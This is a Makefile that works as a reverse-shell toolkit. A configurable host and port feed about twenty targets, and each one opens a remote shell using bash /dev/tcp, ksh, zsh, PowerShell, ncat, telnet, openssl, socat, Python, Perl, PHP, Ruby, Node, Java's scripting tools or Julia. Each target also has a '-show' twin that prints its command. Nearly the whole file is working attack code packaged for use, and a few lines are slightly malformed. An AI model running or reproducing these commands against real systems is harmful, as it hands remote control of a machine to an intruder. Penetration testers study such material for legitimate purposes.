SHELL	:= /bin/bash
HOST	:= 127.0.0.1
PORT	:= 4444
PORT2	:= 4445
FILE	:= $(or $(file), /tmp/f)

LIST	:= "methodlist.txt"

BOLD		:= \033[1m
UNDERLINE	:= \033[4m
GREEN		:= \033[32m
BLUE		:= \033[34m
RESET		:= \033[0m

blue=$(tput setaf 4)
normal=$(tput sgr0)

.PHONY: show

show:
	@printf "SHELL: $(GREEN)$(SHELL)$(RESET)\n"
	@printf "HOST: $(GREEN)$(HOST)$(RESET)\n"
	@printf "PORT: $(GREEN)$(PORT)$(RESET)\n"
	@printf "SECOND PORT*: $(GREEN)$(PORT2)$(RESET)\n"
	@printf "TEMPORARY FILE*: $(GREEN)$(FILE)$(RESET)\n"
	@printf "* = only necessary for some methods\n"
	@printf "\n"
	@printf "To change previous values, run $(UNDERLINE)./configure <shell> <host> <port> [<port2>] [<file>]$(RESET).\n"
	@printf "\n"
	@printf "Available methods:\n"
	@while IFS= read -r cmd; do \
		printf "   $(BOLD)$(BLUE)%s$(RESET)\n" "$$cmd"; \
	done < $(LIST)
	@printf "\n"
	@printf "Run $(UNDERLINE)make <method>$(RESET) to use a specific method from the list.\n"
	@printf "Run $(UNDERLINE)make <method>-show$(RESET) to just see the command(s) for a specific method (without running it).\n"


########################### BASH ###########################

bash1:
	bash -c '$(SHELL) >& /dev/tcp/$(HOST)/$(PORT) 0>&1'

bash1-show:
	@printf "bash -c '$(SHELL) >& /dev/tcp/$(HOST)/$(PORT) 0>&1'\n"

bash2:
	bash -c 'exec 3<>/dev/tcp/$(HOST)/$(PORT); 0<&3; $(SHELL) <&3 >&3 2>&3'

bash2-show:
	@printf "bash -c 'exec 3<>/dev/tcp/$(HOST)/$(PORT); 0<&3; $(SHELL) <&3 >&3 2>&3'\n"

bash3:
	bash -c 'exec 3<>/dev/tcp/$(HOST)/$(PORT); cat <&3 | while read line; do $$line 2>&3 >&3; done'

bash3-show:
	@printf "bash -c 'exec 3<>/dev/tcp/$(HOST)/$(PORT); cat <&3 | while read line; do \$$line 2>&3 >&3; done'\n"

############################################################

######################## KORNSHELL #########################

ksh:
	ksh -c '$(SHELL) > /dev/tcp/$(HOST)/$(PORT) 2>&1 0>&1'

ksh-show:
	@printf "ksh -c '$(SHELL) > /dev/tcp/$(HOST)/$(PORT) 2>&1 0>&1'\n"

############################################################

######################### Z SHELL ##########################

zsh:
	zsh -c 'zmodload zsh/net/tcp; ztcp -d 3 $(HOST) $(PORT); $(SHELL) 0<&3 1>&3 2>&3'

zsh-show:
	@printf "zsh -c 'zmodload zsh/net/tcp; ztcp -d 3 $(HOST) $(PORT); $(SHELL) 0<&3 1>&3 2>&3'\n"

############################################################

####################### SCHEME SHELL #######################

# TODO

############################################################

######################## POWERSHELL ########################

pwsh:
	pwsh -c '$$TCPClient = New-Object Net.Sockets.TCPClient("$(HOST)", $(PORT)); $$NetworkStream = $$TCPClient.GetStream(); $$StreamReader = New-Object IO.StreamReader($$NetworkStream); $$StreamWriter = New-Object IO.StreamWriter($$NetworkStream); $$StreamWriter.AutoFlush = $$true; $$Buffer = New-Object System.Byte[] 1024; while ($$TCPClient.Connected) { while ($$NetworkStream.DataAvailable) { $$RawData = $$NetworkStream.Read($$Buffer, 0, $$Buffer.Length); $$Code = ([text.encoding]::UTF8).GetString($$Buffer, 0, $$RawData -1) }; if ($$TCPClient.Connected -and $$Code.Length -gt 1) { $$Output = try { Invoke-Expression ($$Code) 2>&1 } catch { $$_ }; $$StreamWriter.Write("$$Output`n"); $$Code = $$null } }; $$TCPClient.Close(); $$NetworkStream.Close(); $$StreamReader.Close(); $$StreamWriter.Close()'

pwsh-show:
	@printf "pwsh -c '\$$TCPClient = New-Object Net.Sockets.TCPClient(\"$(HOST)\", $(PORT)); \$$NetworkStream = \$$TCPClient.GetStream(); \$$StreamReader = New-Object IO.StreamReader(\$$NetworkStream); \$$StreamWriter = New-Object IO.StreamWriter(\$$NetworkStream); \$$StreamWriter.AutoFlush = \$$true; \$$Buffer = New-Object System.Byte[] 1024; while (\$$TCPClient.Connected) { while (\$$NetworkStream.DataAvailable) { \$$RawData = \$$NetworkStream.Read(\$$Buffer, 0, \$$Buffer.Length); \$$Code = ([text.encoding]::UTF8).GetString(\$$Buffer, 0, \$$RawData -1) }; if (\$$TCPClient.Connected -and \$$Code.Length -gt 1) { \$$Output = try { Invoke-Expression (\$$Code) 2>&1 } catch { \$$_ }; \$$StreamWriter.Write(\"\$$Output\`n\"); \$$Code = \$$null } }; \$$TCPClient.Close(); \$$NetworkStream.Close(); \$$StreamReader.Close(); \$$StreamWriter.Close()'\n"

############################################################

########################## NETCAT ##########################

ncat1:
	ncat -e $(SHELL) $(HOST) $(PORT)

ncat1-show:
	@printf "ncat -e $(SHELL) $(HOST) $(PORT)\n"

ncat2:
	mkfifo $(FILE); /bin/bash < $(FILE) 2>&1 | ncat 127.0.0.1 4444 > $(FILE); rm $(FILE)

ncat2-show:
	@printf "mkfifo $(FILE); /bin/bash < $(FILE) 2>&1 | ncat 127.0.0.1 4444 > $(FILE); rm $(FILE)\n"

############################################################

########################## TELNET ##########################

telnet1:
	telnet $(HOST) $(PORT) | $(SHELL) 2>&1 | telnet $(HOST) $(PORT2)

telnet1-show:
	@printf "telnet $(HOST) $(PORT) | $(SHELL) 2>&1 | telnet $(HOST) $(PORT2)\n"

telnet2:
	mkfifo $(FILE); $(SHELL) < $(FILE) 2>&1 | telnet $(HOST) $(PORT) > $(FILE); rm $(FILE)

telnet2-show:
	@printf "mkfifo $(FILE); $(SHELL) < $(FILE) 2>&1 | telnet $(HOST) $(PORT) > $(FILE); rm $(FILE)\n"

############################################################

########################## SOCKET ##########################

socket:
	socket -qvp '$(SHELL)' $(HOST) $(PORT)

socket-show:
	@printf "socket -qvp '$(SHELL)' $(HOST) $(PORT)\n"

############################################################

########################## OPENSSL #########################

openssl:
	mkfifo $(FILE); $(SHELL) < $(FILE) 2>&1 | openssl s_client -quiet -connect $(HOST):$(PORT) > $(FILE); rm $(FILE)

openssl-show:
	@printf "mkfifo $(FILE); $(SHELL) < $(FILE) 2>&1 | openssl s_client -quiet -connect $(HOST):$(PORT) > $(FILE); rm $(FILE)\n"

############################################################

########################## PYTHON ##########################

python:
	python -c 'import socket,subprocess,os; s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$(HOST)",$(PORT))); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["$(SHELL)"]);'

python-show:
	@printf "python -c 'import socket,subprocess,os; s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"$(HOST)\",$(PORT))); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"$(SHELL)\"]);'\n"

############################################################

########################### PERL ###########################

perl:
	perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($(PORT),inet_aton("$(HOST)")))){ open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("$(SHELL)");};'

perl-show:
	@printf "perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($(PORT),inet_aton(\"$(HOST)\")))){ open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"$(SHELL)\");};'\n"

############################################################

############################ PHP ###########################

php:
	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); exec("$(SHELL) <&3 >&3 2>&3");'

php-show:
	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); exec(\"$(SHELL) <&3 >&3 2>&3\");'\n"

############################################################

########################### RUBY ###########################

ruby:
	ruby -rsocket -e 'exit if fork; c = TCPSocket.new("$(HOST)",$(PORT)); while(cmd = c.gets); IO.popen(cmd,"r"){|io|c.print io.read} end'

ruby-show:
	@printf "ruby -rsocket -e 'exit if fork; c = TCPSocket.new(\"$(HOST)\",$(PORT)); while(cmd = c.gets); IO.popen(cmd,\"r\"){|io|c.print io.read} end'\n"

############################################################

############################ IRB ###########################

irb:
	echo 'require "socket"; exit if fork; c = TCPSocket.new("$(HOST)",$(PORT)); while(cmd = c.gets); IO.popen(cmd,"r"){|io|c.print io.read} end' | irb

irb-show:
	echo 'require \"socket\"; exit if fork; c = TCPSocket.new(\"$(HOST)\",$(PORT)); while(cmd = c.gets); IO.popen(cmd,\"r\"){|io|c.print io.read} end' | irb

############################################################

########################### NODE ###########################

node:
	node -e 'shell = require("child_process").spawn("$(SHELL)"); require("net").connect($(PORT), "$(HOST)", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'

node-show:
	@printf "node -e 'shell = require(\"child_process\").spawn(\"$(SHELL)\"); require(\"net\").connect($(PORT), \"$(HOST)\"", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'\n"

############################################################

######################## JRUNSCRIPT ########################

jrunscript:
	jrunscript -e 'var p = new java.lang.ProcessBuilder("$(SHELL)").redirectErrorStream(true).start(); var s = new java.net.Socket("$(HOST)",$(PORT)); var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); var po = p.getOutputStream(), so = s.getOutputStream(); while(!s.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(50); try { p.exitValue(); break; } catch (e){}}; p.destroy(); s.close();'

jrunscript-show:
	@printf "jrunscript -e 'var p = new java.lang.ProcessBuilder(\"$(SHELL)\").redirectErrorStream(true).start(); var s = new java.net.Socket(\"$(HOST)\",$(PORT)); var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); var po = p.getOutputStream(), so = s.getOutputStream(); while(!s.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(50); try { p.exitValue(); break; } catch (e){}}; p.destroy(); s.close();'\n"

############################################################

############################ JJS ###########################

jjs:
	echo 'var p = new java.lang.ProcessBuilder("$(SHELL)").redirectErrorStream(true).start(); var s = new java.net.Socket("$(HOST)",$(PORT)); var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); var po = p.getOutputStream(), so = s.getOutputStream(); while(!s.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(50); try { p.exitValue(); break; } catch (e){}}; p.destroy(); s.close();' | jjs

jjs-show:
	@printf "echo 'var p = new java.lang.ProcessBuilder(\"$(SHELL)\").redirectErrorStream(true).start(); var s = new java.net.Socket(\"$(HOST)\",$(PORT)); var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); var po = p.getOutputStream(), so = s.getOutputStream(); while(!s.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(50); try { p.exitValue(); break; } catch (e){}}; p.destroy(); s.close();' | jjs\n"

############################################################

########################## JULIA ###########################

julia:
	julia -e 'using Sockets; sock = connect("$(HOST)", parse(Int64,"$(PORT)")); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'

julia-show:
	@printf "julia -e 'using Sockets; sock = connect(\"$(HOST)\", parse(Int64,\"$(PORT)\")); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`\$$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'\n"

############################################################

########################## SOCAT ###########################

socat:
	socat tcp-connect:$(HOST):$(PORT) exec:$(SHELL),pty,stderr,setsid,sigint,sane

socat-show:
	@printf "socat tcp-connect:$(HOST):$(PORT) exec:$(SHELL),pty,stderr,setsid,sigint,sane\n"

############################################################
